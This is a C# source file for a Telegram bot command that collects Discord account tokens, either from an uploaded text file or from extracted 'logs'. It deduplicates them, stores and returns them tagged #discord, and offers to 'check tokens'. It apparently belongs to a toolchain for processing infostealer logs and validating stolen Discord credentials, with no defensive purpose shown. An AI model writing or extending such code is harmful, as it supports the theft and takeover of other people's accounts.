using System.Text;

using Bot.Core.Models;
using Bot.Core.Models.Commands.Abstractions;
using Bot.Core.Models.Commands.Base;
using Bot.Core.Models.Parsers.Abstractions;
using Bot.Services.Files.System.Models;
using Bot.Services.Files.System.Services;
using Bot.Services.Files.Telegram.Models;
using Bot.Services.Files.Telegram.Services;
using Bot.Telegram.Commands.Common;

using Hangfire;

using Injectio.Attributes;

using TL;

using WTelegram;

namespace Bot.Telegram.Commands.User.Services {
	[RegisterTransient<ICommand<UpdateNewMessage>>(ServiceKey = Keys.Services.Discord), RegisterTransient<ICommand<UpdateBotCallbackQuery>>(ServiceKey = Keys.Services.DiscordCallback)]
	public class Discord(
		//
		Client client,
		SystemFilesRepository files_system,
		TelegramFilesRepository files_telegram,
		IParserStream<Bot.Services.Discord.Models.User> parser,
		
		//
		IConfiguration config,
		ILogger<Discord> logger) : BaseView(client) {

		#region BuildMessage

		public override Task<string> BuildMessage(UpdateNewMessage update, TL.User user) {
			if (update is not {message: Message {media: MessageMediaDocument {document: Document document}}}) {
				return Task.FromResult("File with tokens not found");
			}

			if (document.mime_type != "text/plain") {
				return Task.FromResult("File is not of type .txt");
			}

			return Task.FromResult($"Start processing: {document.Filename}");
		}

		public override Task<string> BuildMessage(UpdateBotCallbackQuery update, TL.User user) {
			return Task.FromResult($"Start processing: {Encoding.UTF8.GetString(update.data[1..])}");
		}

		#endregion

		protected override Task<bool> IsValidAsync(object args, TL.User user) {
			return Task.FromResult(args is UpdateNewMessage {message: Message {media: MessageMediaDocument {document: Document {mime_type: "text/plain"}}}} or UpdateBotCallbackQuery {data: not null});
		}

		protected override Task ProcessAsync(object args, TL.User user) {
			return Task.Run(() => BackgroundJob.Enqueue(() => InvokeAsync(args, user)));
		}

		protected override Task<ReplyInlineMarkup?> DefaultMarkup(object args, TL.User user) {
			return Task.FromResult<ReplyInlineMarkup?>(new() {
				rows = [
					new() {
						buttons = [
							Keys.Common.Dispose_Button
						]
					}
				]
			});
		}

		// Hangfire
		public async Task InvokeAsync(object args, TL.User user) {
			ICollection<string>? tokens = null;
			string name = "";
			int? message_id = null;
            
			logger.LogInformation("[Discord] Parsing tokens");
			switch (args) {
				case UpdateNewMessage {message: Message {media: MessageMediaDocument {document: Document {mime_type: "text/plain"} document}}}:
					name = document.Filename.Split('.')[0];
				
					using (var memory = new MemoryStream()) {

						await client.DownloadFileAsync(document, memory);

						memory.Seek(0, SeekOrigin.Begin);

						using (var reader = new StreamReader(memory)) {
							tokens = (await reader.ReadToEndAsync()).Split('\n').Where(x => !string.IsNullOrEmpty(x)).ToList();
						}
					}
					break;
				case UpdateBotCallbackQuery { data: var data, msg_id: var msg_id }:
					message_id = msg_id;
					
					(name, var path) = config.GetPath(data, Paths.Extracted);

					tokens = await parser.FromLogs(path).Select(x => x.Token).Distinct().ToListAsync();
					break;
			}
			
			logger.LogInformation("[Discord] Parsing completed");

			var args_telegram = new TelegramFilesArgs(name, "txt", "Discord", "text/plain");
			var telegram = await files_telegram.GetAsync(args_telegram);

			var args_system = new SystemFilesArgs(name, "txt", "Discord");
			var system = await files_system.GetAsync(args_system);

			if (telegram is null || system is null) {
				using (var memory = new MemoryStream()) {
					// Write to stream
					await using (var writer = new StreamWriter(memory, leaveOpen: true)) {
						foreach (var token in tokens) {
							await writer.WriteLineAsync(token);
						}
					}
				
					// Save system
					system ??= await files_system.CreateAsync(memory, args_system, false);
				
					await files_system.AddAsync(system);

					// Save telegram
					telegram ??= await files_telegram.CreateAsync(memory, args_telegram, false);

					await files_telegram.AddAsync(telegram);
				}
			}

			var text = "#discord";
			var entities = client.MarkdownToEntities(ref text);
			
			await client.Messages_SendMedia(
				user,
				telegram,
				text,
				Random.Shared.NextInt64(),
				entities: entities
			);
			
			await new ConfirmationCommand(client).ExecuteAsync(user, new(message_id, Keys.Services.DiscordCheckCallback, Keys.StartCallback, "Do you wanna check tokens?", system.Id));
		}
	}
}